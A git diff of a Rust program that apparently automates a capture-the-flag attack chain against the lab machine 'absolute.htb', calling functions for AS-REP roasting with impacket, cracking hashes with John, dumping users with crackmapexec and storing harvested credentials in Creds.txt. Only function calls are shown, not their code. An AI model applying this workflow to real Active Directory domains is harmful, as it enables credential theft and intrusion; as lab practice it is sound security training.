@@ -89,7 +89,9 @@ fn main() {
                 step_2::run_impacket_getnpusers();
                 println!("Cracking Hash...");
                 step_2::run_john();
-                println!("Creds.txt Updated")
+                println!("Creds.txt Updated");
+                step_2::modify_creds_file();
+                print!("Creds.txt Format Fixed");
             }
             "3" => {
                 println!("Warning: This command will sync your time to absolute.htb...");
@@ -100,9 +102,9 @@ fn main() {
                 println!("Creating TGT...");
                 step_4::run_impacket_gettgt_first_user();
                 println!("Dumping Users...");
-                let crackmapexec_output = step_4::run_crackmapexec();
+                step_4::run_crackmapexec();
                 println!("Updating Creds.txt...");
-                step_4::update_creds_file(&crackmapexec_output);
+                step_4::update_creds_file();
                 println!("Creating New TGT for New User...");
                 step_4::run_impacket_gettgt_second_user();
             }
